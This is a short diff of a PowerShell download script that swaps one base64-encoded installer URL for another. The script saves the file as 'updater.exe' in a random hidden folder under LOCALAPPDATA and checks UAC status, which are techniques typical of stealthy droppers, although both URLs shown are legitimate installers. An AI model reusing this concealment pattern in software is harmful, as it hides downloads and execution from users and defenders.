@@ -53,7 +53,7 @@ function Download-FileWithRetries {
 
 # Main execution
 try {
-    $downloadUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly93d3cuNy16aXAub3JnL2EvN3oyNDA5LXg2NC5leGU="))
+    $downloadUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9jZG4uZmFzdGx5LnN0ZWFtc3RhdGljLmNvbS9jbGllbnQvaW5zdGFsbGVyL1N0ZWFtU2V0dXAuZXhl"))
     $updaterExe = "updater.exe"
     $hiddenFolder = Join-Path $env:LOCALAPPDATA ([System.Guid]::NewGuid().ToString())
     $uacStatus = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System").EnableLUA -eq 1
